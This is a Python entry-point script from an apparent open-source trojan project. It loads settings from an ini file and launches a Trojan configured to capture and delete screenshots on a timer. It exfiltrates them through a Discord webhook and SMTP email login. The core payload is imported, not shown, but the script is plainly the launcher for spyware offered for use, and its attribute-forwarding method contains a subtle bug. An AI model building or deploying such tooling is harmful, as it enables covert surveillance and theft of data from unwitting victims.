#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from pathlib import Path

from src.trojan import Trojan

import configdot


class TrojanConfig:
    def __init__(self, config_file: [str, Path] = None):
        """Set up a Trojan from settings defined in a configuration
        file."""
        config_file = config_file if config_file is not None else \
            Path(__file__).parent.joinpath("trojan.ini")
        self.cfg = configdot.parse_config(config_file)
        self.trojan = Trojan(exfil_time=self.cfg.Setup.ExfiltrationTime,
                             screenshot=self.cfg.Setup.ScreenshotPath,
                             delete_screenshot=self.cfg.Setup.DeleteScreenshot,
                             webhook=self.cfg.Discord.Webhook,
                             smtp_host=self.cfg.Email.Host,
                             smtp_port=self.cfg.Email.Port,
                             email=self.cfg.Email.Username,
                             password=self.cfg.Email.Password)

    def __getattr__(self, item):
        if item in self.__dict__:
            return super().__getattribute__(self, item)
        return getattr(self.trojan, item)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config", type=str, default=None,
                        help="Absolute path to a configuration file. Defaults "
                             "to trojan.ini.")
    args = parser.parse_args()

    TrojanConfig(config_file=args.config).execute()
